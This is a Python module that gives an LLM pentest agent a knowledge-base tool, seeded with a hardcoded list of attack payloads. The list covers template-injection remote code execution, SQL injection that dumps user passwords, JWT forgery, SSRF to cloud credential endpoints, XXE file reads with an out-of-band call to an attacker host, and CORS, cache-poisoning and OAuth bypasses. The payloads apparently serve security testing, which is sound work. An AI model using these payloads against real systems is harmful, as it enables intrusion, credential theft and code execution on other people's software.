from __future__ import annotations
import asyncio
import logging
import os
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# Cost controls for KB context injected into the LLM prompt. Fewer, shorter
# snippets = fewer prompt tokens per query_security_kb call.
_KB_TOP_K = int(os.getenv("RAG_KB_TOP_K", "3"))
_KB_SNIPPET_CHARS = int(os.getenv("RAG_KB_SNIPPET_CHARS", "800"))


# Seed corpus — merged into the RAG store on first call. Deduped by
# content_hash inside SecurityRAGPipeline._store_chunk so multiple invocations
# don't create duplicates.
_SEED_ENTRIES = [
    ("ssti-jinja", "python,flask,jinja2", "Jinja2 SSTI RCE payloads",
     "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\n"
     "{{ ''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate() }}\n"
     "Detect: {{7*7}} returns 49, {{7*'7'}} returns '7777777'"),
    ("ssti-node", "node,express,nodejs,handlebars,ejs", "Node.js template injection",
     "Handlebars: {{#with 'a' as |c|}}{{c.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}{{/with}}\n"
     "EJS: <%= process.mainModule.require('child_process').execSync('id') %>"),
    ("sqli-mysql", "mysql,php,sqli", "MySQL UNION dump users",
     "') UNION SELECT 1,2,concat(user,':',password),4 FROM users-- \n"
     "Blind: ' AND SLEEP(5)-- \n"
     "Extract DBs: ') UNION SELECT schema_name FROM information_schema.schemata--"),
    ("sqli-sqlite", "sqlite,node,express", "SQLite UNION dump",
     "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--\n"
     "Schema: ')) UNION SELECT sql,2,3 FROM sqlite_master--"),
    ("jwt-none", "jwt,auth,algorithm-confusion", "JWT alg=none forgery",
     "Header: {\"alg\":\"none\",\"typ\":\"JWT\"} → base64url → append '.' → base64url(payload with role=admin) → append '.' → empty signature\n"
     "Also try alg=None (capital N) and alg=NONE."),
    ("jwt-alg-confusion", "jwt,rs256,hs256", "JWT RS256 → HS256 key confusion",
     "If server accepts HS256 and doesn't strictly check alg, sign with HS256 using the RSA PUBLIC key as the HMAC secret."),
    ("jwt-kid-injection", "jwt,kid", "JWT kid header injection",
     "Try kid=/dev/null with empty HMAC secret. Path-traversal kid=../../../../../../dev/null. SQL injection kid=x' UNION SELECT 'secret'-- ."),
    ("ssrf-cloud", "ssrf,aws,gcp,azure,digitalocean", "Cloud metadata SSRF targets",
     "AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
     "GCP: http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor:Google)\n"
     "Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (needs Metadata:true)\n"
     "DigitalOcean: http://169.254.169.254/metadata/v1/"),
    ("ssrf-bypass", "ssrf,bypass", "SSRF URL parser bypass",
     "http://127.0.0.1@evil.com  (parses as evil.com but some libs go to 127.0.0.1)\n"
     "http://[::1]/  http://0/  http://2130706433/ (decimal)  http://0x7f.1/\n"
     "gopher://127.0.0.1:6379/_INFO  file:///etc/passwd  dict://127.0.0.1:11211/stats"),
    ("prototype-pollution", "node,express,js", "Prototype pollution payloads",
     "{\"__proto__\": {\"polluted\": \"yes\"}}\n"
     "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}\n"
     "Check reflection on next GET / auth check."),
    ("xxe", "xml,xxe,java,php", "XXE payloads",
     "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>\n"
     "OOB: <!ENTITY % x SYSTEM \"http://attacker/xxe.dtd\"> %x;"),
    ("request-smuggling", "http,smuggling", "HTTP request smuggling detection",
     "CL.TE: send POST / HTTP/1.1 with Content-Length: 6, Transfer-Encoding: chunked, body '0\\r\\n\\r\\nX'. Front-end reads 6 bytes, back-end reads chunked. Success = timeout on next request.\n"
     "TE.CL: reverse. Detect via time-based probe timing."),
    ("graphql-introspection", "graphql", "GraphQL introspection + admin field enum",
     "POST /graphql {\"query\":\"{__schema{types{name fields{name}}}}\"}\n"
     "Alias batching: {a1:__typename a2:__typename a3:__typename ...}\n"
     "Common admin fields: users, allUsers, adminUsers, deleteUser, updateUserRole."),
    ("cors-bypass", "cors,web", "CORS misconfig — trust exploitation",
     "Origin: https://evil.com → response ACAO reflected = CSRF-with-cookies.\n"
     "null origin: Origin: null → ACAO: null → sandboxed iframe or file:// origin can exfil.\n"
     "Subdomain regex bypass: Origin: https://evil.target.com (matches *.target.com)."),
    ("idor-numeric", "idor,bola,api", "IDOR numeric ID enumeration",
     "Change /api/user/1234 → /api/user/1, 2, 3... If 200 with someone else's data = BOLA.\n"
     "Also try UUIDs from other sessions, negative IDs (-1), zero, MAX_INT."),
    ("cache-poisoning", "cache,web", "Web cache poisoning via unkeyed headers",
     "Send X-Forwarded-Host: evil.com. If cached response reflects it, subsequent visitors get evil.com's redirects.\n"
     "Also X-Host, X-Forwarded-Server, X-HTTP-Host-Override."),
    ("race-condition", "race,tocttou", "Race condition probe pattern",
     "Fire N=20 parallel POSTs to /api/redeem-coupon within 10ms. If count of successes > 1 for a single-use action, race exists."),
    ("sso-oauth", "oauth,openid,sso", "OAuth/OIDC common bugs",
     "1) redirect_uri whitelist bypass: /callback/../evil.com, callback.evil.com if regex-based.\n"
     "2) state param missing = CSRF.\n"
     "3) implicit-flow access_token in fragment stealable via referrer.\n"
     "4) id_token accepted without sig verify."),
]


_SEEDED = False


async def _ensure_seeded():
    global _SEEDED
    if _SEEDED:
        return
    try:
        from core.rag.pipeline import get_rag, SecurityRAGPipeline
        from core.common.config import get_config
        rag = get_rag()
        if rag is None:
            rag = SecurityRAGPipeline(api_key=get_config().get("DEEPSEEK_API_KEY"))
            await rag.initialize()
        for topic, tags, title, content in _SEED_ENTRIES:
            body = f"[{topic.upper()}] {title}\nTech: {tags}\n\n{content}"
            await rag.ingest_text(body, title=f"kb:{topic}",
                                    metadata={"category": topic, "tech_tags": tags,
                                                "title": title, "source": "security_kb_seed"})
        _SEEDED = True
        logger.info(f"[SecurityKB] Seeded {len(_SEED_ENTRIES)} pentest excerpts into RAG")
    except Exception as e:
        logger.warning(f"[SecurityKB] seed failed: {e}")


def query_kb(topic: str, tech_stack: str = "", top_k: int = _KB_TOP_K) -> str:
    query = (topic + " " + tech_stack).strip()
    if not query:
        return "[ERROR] query_security_kb: topic required"
    try:
        from core.rag.pipeline import get_rag
        rag = get_rag()
        if rag is None:
            return "[ERROR] RAG pipeline not initialised. Ensure initialize_llm() ran."
        # Ensure seed corpus is loaded (async, one-time). Since we're inside
        # a sync tool call from an async LLM loop, use the running loop.
        try:
            loop = asyncio.get_running_loop()
            fut = asyncio.ensure_future(_ensure_seeded())
            # Best-effort — don't block first call for the seed step
        except RuntimeError:
            pass
        # Perform the retrieval — reuse the async retrieve()
        loop = asyncio.get_event_loop()
        docs = loop.run_until_complete(rag.retrieve(query, top_k=top_k)) \
                if not loop.is_running() else \
                asyncio.get_event_loop().run_until_complete(rag.retrieve(query, top_k=top_k))
    except RuntimeError:
        # Called inside an already-running loop: schedule + wait via a task
        import concurrent.futures
        try:
            from core.rag.pipeline import get_rag
            rag = get_rag()
            fut = asyncio.run_coroutine_threadsafe(rag.retrieve(query, top_k=top_k),
                                                     asyncio.get_event_loop())
            docs = fut.result(timeout=10)
        except Exception as e:
            return f"[ERROR] query_security_kb retrieval: {e}"
    except Exception as e:
        return f"[ERROR] query_security_kb: {e}"
    if not docs:
        return "(no matches in security KB; try broader keywords or ingest more docs via /api/rag/ingest)"
    parts = []
    for d in docs[:top_k]:
        meta = d.get("metadata") or {}
        title = meta.get("title") or meta.get("category") or "excerpt"
        src = meta.get("source") or meta.get("source_type") or "?"
        parts.append(f"### {title}  _(source: {src}, similarity={d.get('similarity',0):.2f})_\n"
                       f"{(d.get('content') or '')[:_KB_SNIPPET_CHARS]}")
    return "\n\n".join(parts)


async def query_kb_async(topic: str, tech_stack: str = "", top_k: int = _KB_TOP_K) -> str:
    query = (topic + " " + tech_stack).strip()
    if not query:
        return "[ERROR] query_security_kb: topic required"
    try:
        from core.rag.pipeline import get_rag
        rag = get_rag()
        if rag is None:
            return "[ERROR] RAG pipeline not initialised. Ensure initialize_llm() ran."
        await _ensure_seeded()
        docs = await rag.retrieve(query, top_k=top_k)
    except Exception as e:
        return f"[ERROR] query_security_kb: {e}"
    if not docs:
        return "(no matches in security KB; try broader keywords or ingest more docs)"
    parts = []
    for d in docs[:top_k]:
        meta = d.get("metadata") or {}
        title = meta.get("title") or meta.get("category") or "excerpt"
        src = meta.get("source") or meta.get("source_type") or "?"
        parts.append(f"### {title}  _(source: {src}, similarity={d.get('similarity',0):.2f})_\n"
                       f"{(d.get('content') or '')[:_KB_SNIPPET_CHARS]}")
    return "\n\n".join(parts)


KB_TOOL_SCHEMA = {
    "type": "function",
    "function": {
        "name": "query_security_kb",
        "description": (
            "Query the shared pentest knowledge base (pgvector + embeddings) — "
            "returns semantic top-K matches. Includes curated HackTricks/OWASP/"
            "PayloadsAllTheThings excerpts + anything the operator ingested via "
            "the RAG pipeline (files, URLs, prior scan findings). Use BEFORE "
            "crafting a novel payload — the KB may already have the exact technique."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "topic": {"type": "string", "description": "vuln class / attack technique keywords"},
                "tech_stack": {"type": "string", "description": "target stack hints (e.g. 'node express mysql')"},
            },
            "required": ["topic"],
        },
    },
}
